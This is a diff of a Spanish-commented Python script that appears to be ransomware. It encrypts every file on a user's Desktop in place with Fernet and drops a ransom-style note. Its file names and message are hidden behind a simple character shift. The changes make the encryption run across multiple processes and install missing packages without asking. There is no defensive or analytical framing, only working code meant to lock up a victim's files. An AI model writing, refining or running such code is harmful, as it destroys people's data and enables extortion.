@@ -1,8 +1,22 @@
-from cryptography.fernet import Fernet
 import os
+import subprocess
+import pkg_resources
+import multiprocessing
+from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import simpledialog
-from concurrent.futures import ThreadPoolExecutor
+
+REQUIRED_PACKAGES = [
+    'cryptography'
+]
+
+for package in REQUIRED_PACKAGES:
+    try:
+        dist = pkg_resources.get_distribution(package)
+        print('{} ({}) está instalado'.format(dist.key, dist.version))
+    except pkg_resources.DistributionNotFound:
+        print('{} NO está instalado'.format(package))
+        subprocess.call(['pip', 'install', package])
 
 def desencriptar(cadena):
     return ''.join(chr(ord(c) - 1) for c in cadena)
@@ -16,17 +30,13 @@ def generar_key():
 def cargar_key():
     return open(desencriptar("lfp.lfp"), 'rb').read()
 
-def encrypt_file(item, key):
+def encrypt(item, key):
     f = Fernet(key)
     with open(item, 'rb') as file:
         file_data = file.read()
     encrypted_data = f.encrypt(file_data)
     with open(item, 'wb') as file:
         file.write(encrypted_data)
-
-def encrypt(items, key):
-    with ThreadPoolExecutor() as executor:
-        executor.map(encrypt_file, items, [key]*len(items))
 
 def get_all_files_in_directory(dir_path):
     files_list = []
@@ -36,12 +46,13 @@ def get_all_files_in_directory(dir_path):
     return files_list
 
 if __name__ == '__main__':
-    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con su nombre de usuario
+    path_to_encrypt = 'C:\\Users\\[nombre de usuario]\\Desktop'  # Reemplaza [nombre de usuario] con tu nombre de usuario
     all_files = get_all_files_in_directory(path_to_encrypt)
 
     key = generar_key()
 
-    encrypt(all_files, key)
+    with multiprocessing.Pool() as pool:
+        pool.starmap(encrypt, [(file, key) for file in all_files])
 
     with open(path_to_encrypt+'\\'+desencriptar("sfbenf.ufy"), 'w') as file:
         file.write(desencriptar('Gjdifspft fodsjuqbept qps fm ujup Fsspejohfs\n'))
@@ -52,6 +63,8 @@ if __name__ == '__main__':
     root.withdraw()
     password = simpledialog.askstring("Contraseña", "Introduce la contraseña para encriptar los archivos:", show='*')
     if password == "contraseña_correcta":
-        encrypt(all_files, key)
+        with multiprocessing.Pool() as pool:
+            pool.starmap(encrypt, [(file, key) for file in all_files])
     else:
         print("Contraseña incorrecta.")
+
